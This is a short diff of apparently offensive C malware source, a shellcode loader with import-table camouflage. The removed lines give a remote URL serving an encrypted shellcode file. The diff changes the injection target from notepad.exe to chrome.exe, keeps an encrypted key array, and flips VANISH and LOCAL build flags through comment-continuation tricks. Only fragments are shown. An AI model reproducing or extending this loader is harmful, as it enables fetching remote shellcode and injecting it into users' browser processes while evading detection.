@@ -6,8 +6,8 @@
 #include "IATCamo.h"
 #include "Debug.h"
 
-#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/encrypted_shellcode.bin"
-#define PROC L"notepad.exe"
+#define PAYLOAD L""
+#define PROC L"chrome.exe"
 
 
 
@@ -27,10 +27,10 @@ unsigned char ProtectedKey[] = {
         0x8C, 0xA6, 0xDE, 0x60, 0x5C, 0x28, 0x08, 0x5A, 0x90, 0xA8, 0xAF, 0x6E, 0xB6, 0x91, 0x63, 0x81 };
 
 //
-//\
+//
 #define VANISH
 
-//
+//\
 #define LOCAL
 
 
